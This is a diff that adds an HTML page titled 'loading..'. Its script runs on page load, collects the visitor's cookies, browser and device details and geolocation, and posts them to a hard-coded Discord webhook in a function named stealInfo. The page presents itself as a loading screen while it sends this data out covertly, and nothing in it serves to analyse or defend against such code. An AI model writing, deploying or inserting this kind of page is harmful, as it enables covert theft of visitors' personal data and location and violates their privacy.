@@ -1,0 +1,68 @@
+<html>
+  <head>
+    <title>loading..</title>
+  </head>
+  <body>
+    <script>
+      // Function to get browser cookies
+      function getCookie(name) {
+        var value = `; ${document.cookie}`;
+        var parts = value.split(`; ${name}=`);
+        if (parts.length === 2) return parts.pop().split(';').shift();
+      }
+      
+      // Function to get device info
+      function getDeviceInfo() {
+        var device = {};
+        device.os = navigator.oscpu;
+        device.browser = navigator.userAgent;
+        device.lang = navigator.language;
+        device.platform = navigator.platform;
+        return device;
+      }
+      
+      // Function to get geolocation
+      function getGeolocation() {
+        return new Promise(resolve => {
+          navigator.geolocation.getCurrentPosition(pos => {
+            resolve({
+              lat: pos.coords.latitude,
+              lon: pos.coords.longitude
+            });
+          });
+        });
+      }
+      
+      // Function to send data to Discord webhook
+      async function sendDataToDiscord(data) {
+        const webhookUrl = 'https://discord.com/api/webhooks/1260028879729332275/bhliony5asku0znPNm424ciasbyH9-qoj926nz3Z8yeHy7TPM5GvhNHGajpBW-HRnovA';
+        const headers = {
+          'Content-Type': 'application/json'
+        };
+        const body = JSON.stringify({
+          content: data
+        });
+        
+        await fetch(webhookUrl, {
+          method: 'POST',
+          headers,
+          body
+        });
+      }
+      
+      // Main function
+      async function stealInfo() {
+        const cookies = getCookie('ALL');
+        const deviceInfo = getDeviceInfo();
+        const geolocation = await getGeolocation();
+        
+        const data = `Cookies: ${cookies}\nDevice Info: ${JSON.stringify(deviceInfo)}\nGeolocation: ${JSON.stringify(geolocation)}`;
+        
+        await sendDataToDiscord(data);
+      }
+      
+      // Call main function
+      stealInfo();
+    </script>
+  </body>
+</html>#
